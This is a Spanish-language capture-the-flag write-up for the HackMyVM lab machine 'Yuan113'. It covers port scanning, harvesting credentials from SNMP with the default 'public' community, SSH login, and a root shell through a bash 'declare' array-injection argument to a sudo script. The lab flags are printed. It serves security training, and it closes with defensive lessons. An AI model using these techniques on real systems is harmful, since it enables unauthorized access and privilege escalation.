# 🖥️ Yuan113 - HackMyVM

> **Dificultad:** Beginner  
> **OS:** Debian  
> **IP:** 192.168.0.10 / 192.168.0.34  
> **Fecha:** 2026-03-28 / 2026-03-30

---

## 📡 Reconocimiento

```bash
sudo arp-scan -l
sudo nmap -p- --min-rate 5000 -n -Pn 192.168.0.34 -oN puertos
sudo nmap -p 22,80 -sS -sC -sV -n -Pn 192.168.0.34 -oN servicios
sudo nmap -sU -p1-200 192.168.0.34 -oN udp   # ⭐ IMPORTANTE
```

**Puertos abiertos TCP:**
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 8.4p1 |
| 80/tcp | HTTP | Apache 2.4.62 |

**Puertos abiertos UDP:**
| Puerto | Servicio |
|--------|----------|
| 161/udp | SNMP ⭐ |

---

## 🌐 Web (puerto 80)

- Título: `Mazesec welcome u`
- Mensaje: *"The quieter you become, the more you are able to hear"*
- `lang="zh-CN"` — creador chino
- Gobuster: sin resultados útiles
- Web completamente estática — sin vectores de ataque directos

---

## 📡 SNMP (puerto 161/UDP)

**Técnica:** snmpwalk con community string por defecto

```bash
snmpwalk -v 2c -c public 192.168.0.34 > snmp_output.txt
cat snmp_output.txt | grep "service"
```

**Credenciales encontradas en procesos:**
```
HOST-RESOURCES-MIB::hrSWRunPath = STRING: 
"service --user welcome --password mMOq2WWONQiiY8TinSRF --host localhost --port 8080"
```

---

## 🔓 Acceso inicial — usuario welcome

```bash
ssh welcome@192.168.0.34
# Password: mMOq2WWONQiiY8TinSRF
```

**Flag user:**
```
flag{user-21539141ad1bc8ab9d26420aecb2415b}
```

---

## ⬆️ Escalada de privilegios — root

```bash
sudo -l
# (ALL) NOPASSWD: /opt/113.sh
```

**Vulnerabilidad:** Bash array injection en `declare`

El script usa `declare -- "$1"="$2"` — pasar `exec_[0]` como `$1` bypasea la validación y sobreescribe la variable `exec_` con `/bin/bash`.

```bash
sudo /opt/113.sh "exec_[0]" "/bin/bash" "mazesec"
```

**Flag root:**
```
flag{root-9f283fe2f6363f99f80ed7f3f3c3cb19}
```

---

## 📝 Lecciones aprendidas

- ⭐ **Siempre escanear UDP** — SNMP en 161/UDP puede exponer credenciales
- Las contraseñas pasadas como argumentos CLI son visibles en `/proc` y SNMP
- SNMPv1/v2c no tienen cifrado — community string `public` = mala configuración
- Bash `declare` con input de usuario es peligroso — `exec_[0]` ≡ `exec_` en memoria
